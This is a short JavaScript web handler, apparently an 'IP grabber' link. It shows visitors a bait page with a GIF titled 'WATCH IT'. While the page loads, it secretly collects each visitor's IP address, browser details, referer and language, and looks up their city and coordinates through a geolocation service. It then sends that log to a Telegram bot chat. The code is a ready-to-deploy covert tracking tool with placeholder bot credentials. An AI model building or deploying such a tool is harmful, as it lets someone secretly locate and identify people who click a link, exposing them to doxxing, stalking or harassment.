// /web/TELEGRAM/rayzer.js

const BOT_TOKEN = "PUT_BOT_TOKEN_HERE";
const CHAT_ID = "PUT_CHAT_ID_HERE";
const GIF_URL = "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif";

export default async function handler(req, res) {
  const ip = (req.headers["x-forwarded-for"] || req.connection.remoteAddress || "").split(",")[0].trim();
  const userAgent = req.headers["user-agent"] || "None";
  const referer = req.headers["referer"] || "None";
  const lang = req.headers["accept-language"] || "None";

  let geo = {};
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,query`);
    geo = await r.json();
  } catch {
    geo = { country: "?", city: "?", regionName: "?", lat: "?", lon: "?", isp: "?" };
  }

  const message = `🔍 *New Log*
  
*IP:* \`${ip}\`
*Location:* ${geo.city}, ${geo.regionName}, ${geo.country}
*Cords:* ${geo.lat}, ${geo.lon}
*ISP:* ${geo.isp || "Unknown"}
*User-Agent:* \`${userAgent}\`
*Referer:* ${referer}
*Language:* ${lang}

📅 ${new Date().toISOString()}`;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown"
    })
  }).catch(() => { });

  res.setHeader("Content-Type", "text/html");
  res.status(200).send(`
    <!DOCTYPE html>
    <html>
      <head><title>WATCH IT</title><meta name="viewport" content="width=device-width, initial-scale=1.0"/></head>
      <body style="margin:0;background:black;display:flex;justify-content:center;align-items:center;height:100vh;">
        <img src="${GIF_URL}" style="max-width:100%;height:auto;" />
      </body>
    </html>
  `);
}
